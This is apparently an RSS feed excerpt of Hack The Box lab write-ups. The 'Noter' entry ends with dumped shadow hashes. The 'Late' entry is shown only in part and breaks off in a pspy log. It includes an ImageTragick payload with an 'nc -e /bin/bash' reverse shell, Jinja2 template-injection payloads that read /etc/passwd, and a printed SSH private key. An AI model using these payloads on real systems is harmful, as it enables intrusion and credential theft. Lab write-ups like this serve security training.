<span id="cb15-19"></span>
<span id="cb15-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc@noter:/dev/shm$</span> cat flag.txt</span>
<span id="cb15-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">6c96f935fcd96c108b9abaa111e3c613</span></span>
<span id="cb15-22"></span>
<span id="cb15-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc@noter:/dev/shm$</span> cat shadow</span>
<span id="cb15-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$0</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9RSjU3jIh/2JW1u</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$8</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">jlcYzW5Oyzgh/TrlTPX5Wq2HMTA6zUooij/9j0.NIttTYp4x0h6wmq8chrcdtvNpZzHlHzwsI8GesOKI3NYn.:18991:0:99999:7:::</span></span>
<span id="cb15-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$gTM</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.AIsgDue4r5AQ</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$wUBfUtg7</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/svAcRTnsFv51KuMpeNP0cL6vqIR3608pzd0YsNNe0oxMwvY7iAGMCgMp7viiBLUwUaAZx4r6ljME/:18988:0:99999:7:::</span></span>
<span id="cb15-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ftp_admin:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$gQyFQc6w7p83bBwZ$6</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">zYRlPKPBp6GMgUI5mbojxOvyup7hqrQ5hfscnLkwvIimC6qO5a0taiju1vYQPSnzf.mO5TgCdo.5RiO9Gu7J0:19114:0:99999:7:::</span></span>
<span id="cb15-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">blue:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$pNud9u</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/1PdD8qPYi</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$cSe5FPCRGH5xjUiEMJ5tXSclSrWSz7gimtR2IcXiiVk0xNfSACcVgU3C4z69RnZHEQKrNO</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/hIiUQdVTqlxb29.:19114:0:99999:7:::</span></span></code></pre></div>
<hr>
</section>
</section>
<section id="references" class="level1">
<h1>References</h1>
<p><strong>Privesc, MySQL User Defined Functions</strong> https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf https://www.exploit-db.com/exploits/1518</p>


</section>

 ]]></description>
  <category>hackthebox</category>
  <category>medium</category>
  <category>linux</category>
  <category>ftp</category>
  <category>bruteforce</category>
  <category>flask</category>
  <category>subprocess</category>
  <category>mysql</category>
  <guid>https://exploit.se/posts/2022-05-23-htb-writeup-noter/2022-05-23-htb-writeup-noter.html</guid>
  <pubDate>Mon, 23 May 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-05-23-htb-writeup-noter/images/noter_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>Late - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-05-16-htb-writeup-late/2022-05-16-htb-writeup-late.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  late nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span> 10.10.11.156</span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http</span>
<span id="cb1-5"></span>
<span id="cb1-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  late nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p22,80</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> 10.10.11.156</span>
<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE SERVICE VERSION</span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">22/tcp</span> open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span> Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">protocol</span> 2.0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-9"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssh-hostkey:</span> </span>
<span id="cb1-10"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2048</span> 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">RSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-11"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">256</span> 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ECDSA</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-12"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ED25519</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span> open  http    nginx 1.14.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-14"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> nginx/1.14.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-15"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Late <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Best online image tools</span>
<span id="cb1-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Service</span> Info: OS: Linux<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CPE:</span> cpe:/o:linux:linux_kernel</span>
<span id="cb1-17"></span>
<span id="cb1-18"></span>
<span id="cb1-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[root:/git/htb/pandora]#</span> nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sU</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--top-port</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>20 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--open</span> 10.10.11.136</span>
<span id="cb1-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>     STATE         SERVICE</span>
<span id="cb1-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">67/udp</span>   open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> dhcps</span>
<span id="cb1-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">68/udp</span>   open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> dhcpc</span>
<span id="cb1-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">135/udp</span>  open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> msrpc</span>
<span id="cb1-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">137/udp</span>  open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> netbios-ns</span>
<span id="cb1-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">138/udp</span>  open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> netbios-dgm</span>
<span id="cb1-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">161/udp</span>  open          snmp</span>
<span id="cb1-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">520/udp</span>  open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> route</span>
<span id="cb1-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">4500/udp</span> open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> nat-t-ike</span></code></pre></div>
<p>Browsing the webpage we find <code>images.late.htb</code>, add it to <code>/etc/hosts</code> and proceed. The site is very basic and lets us upload an image which will be converted to a text document.</p>
<p><img src="https://exploit.se/posts/2022-05-16-htb-writeup-late/images/late01.png" class="img-fluid"> This lead me down the road of “ImageTragick” trying to inject code with the following string:</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">push</span> graphic-context</span>
<span id="cb2-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">viewbox</span> 0 0 640 480</span>
<span id="cb2-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fill</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'url(https://nothing/here.jpg"|nc -e /bin/bash 10.10.14.18 "4488)'</span></span>
<span id="cb2-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">pop</span> graphic-context</span></code></pre></div>
<p>Although it gave nothing.. so instead we look on the later part of the description “.. with flask”, why do they specify that? Reading about Flask vulnerabilities we find a lot of information about Flask and Jinja, specifically Server-Side Template Injections (SSTI), where the HTB box Doctor is referenced.</p>
<p>We go to HackTricks and grab all the different operations to find which template engine is being used.</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## REQUEST</span></span>
<span id="cb3-2"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">${7</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">*7</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb3-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">{%</span> raw %}{{7<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>7}}{% endraw %}</span>
<span id="cb3-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">{%</span> raw %}{{7<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'7'</span>}}{% endraw %}</span>
<span id="cb3-5"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>%= <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">7*7</span> %<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb3-6"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#{7*7}</span></span>
<span id="cb3-7"></span>
<span id="cb3-8"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## RESPONSE</span></span>
<span id="cb3-9"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">${7</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">*7</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb3-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49</span></span>
<span id="cb3-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">7777777</span></span>
<span id="cb3-12"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>%= <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">7*7</span> %<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb3-13"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#{7*7}</span></span></code></pre></div>
<p>We see that both {% raw %}<code>{7*7}</code>{% endraw %} and {% raw %}<code>{7*'7'}</code>{% endraw %} are calculated/modified. Looking on the “SSTI chart” we can deduce it’s either the template engine <strong>Jinja2</strong>, <strong>Twig</strong> or <strong>Unknown</strong>.</p>
<p><img src="https://exploit.se/posts/2022-05-16-htb-writeup-late/images/late02.png" class="img-fluid"></p>
<p><strong>Twig</strong>: {% raw %}{{7*‘7’}}{% endraw %} = 49</p>
<p><strong>Jinja2</strong>: {% raw %}{{7*‘7’}}{% endraw %} = 7777777</p>
<p>We’ve successfully detected the template engine, <strong>Jinja2</strong>.</p>
<table class="caption-top table">
<colgroup>
<col style="width: 100%">
</colgroup>
<tbody>
<tr class="odd">
<td style="text-align: left;">### Step 2 Playing around with Jinja2 terms I tried to go with: {% raw %}<code>{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }</code>{% endraw %}</td>
</tr>
<tr class="even">
<td style="text-align: left;">After trying several fonts in different sizes, I finally got it to work with <code>Hack Regular</code> size 35.</td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>bash ## REPLY root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin saned:x:115:119::/var/lib/saned:/usr/sbin/nologin colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin</code></td>
</tr>
<tr class="even">
<td style="text-align: left;">We find 2 users available to login:</td>
</tr>
<tr class="odd">
<td style="text-align: left;">Looking for a ssh private key we find <code>/home/svc_acc/.ssh/id_rsa</code>. ```bash ## REQUEST {% raw %}{{get_flashed_messages.__globals__.__builtins__.open(“/home/svc_acc/.ssh/id_rsa”).read()}}{% endraw %}</td>
</tr>
<tr class="even">
<td style="text-align: left;">## RESPONSE —–BEGIN RSA PRIVATE KEY—– MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi /mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7 d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7 7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0 ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7 t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq 0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y 3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+ Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0 kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw== —–END RSA PRIVATE KEY—– ```</td>
</tr>
<tr class="odd">
<td style="text-align: left;">Login and grab <code>user.txt</code>:</td>
</tr>
</tbody>
</table>
</section>
</section>
<section id="root" class="level1">
<h1>Root</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<ul>
<li><code>sudo -l</code> requires password, so that’s a no-go.</li>
</ul>
<p>Lets look if there’s any service or commands running regularly that we can hijack, using <code>pspy64</code>.</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc_acc@late:/dev/shm$</span> ./pspy64</span>
<span id="cb4-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb4-3"></span>
<span id="cb4-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:10:01 CMD: UID=0    PID=3412   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cp</span> /root/scripts/ssh-alert.sh /usr/local/sbin/ssh-alert.sh </span>
<span id="cb4-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:10:01 CMD: UID=0    PID=3414   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chown</span> svc_acc:svc_acc /usr/local/sbin/ssh-alert.sh </span>
<span id="cb4-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:10:01 CMD: UID=0    PID=3416   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">rm</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-r</span> /home/svc_acc/app/misc/<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span> </span>
<span id="cb4-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:11:01 CMD: UID=0    PID=3420   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/bash</span> /root/scripts/cron.sh </span>
<span id="cb4-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:11:01 CMD: UID=0    PID=3419   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/sh</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> /root/scripts/cron.sh </span>
<span id="cb4-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:11:01 CMD: UID=0    PID=3418   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/sbin/CRON</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> </span>
<span id="cb4-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:12:01 CMD: UID=0    PID=3432   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/bash</span> /root/scripts/cron.sh </span>
<span id="cb4-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:12:01 CMD: UID=0    PID=3431   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/sh</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> /root/scripts/cron.sh </span>
<span id="cb4-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:12:01 CMD: UID=0    PID=3429   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/sbin/CRON</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> </span>
<span id="cb4-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:12:01 CMD: UID=0    PID=3436   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chmod</span> +x /usr/local/sbin/ssh-alert.sh </span>
<span id="cb4-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:12:01 CMD: UID=0    PID=3437   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">chown</span> svc_acc:svc_acc /usr/local/sbin/ssh-alert.sh </span>
<span id="cb4-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:13:01 CMD: UID=0    PID=3443   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/bash</span> /root/scripts/cron.sh </span>
<span id="cb4-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:13:01 CMD: UID=0    PID=3442   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/sh</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> /root/scripts/cron.sh </span>
<span id="cb4-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:13:01 CMD: UID=0    PID=3441   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/sbin/CRON</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> </span>
<span id="cb4-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:14:01 CMD: UID=0    PID=3454   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/bash</span> /root/scripts/cron.sh </span>
<span id="cb4-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:14:01 CMD: UID=0    PID=3453   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/sh</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> /root/scripts/cron.sh </span>
<span id="cb4-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:14:01 CMD: UID=0    PID=3452   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
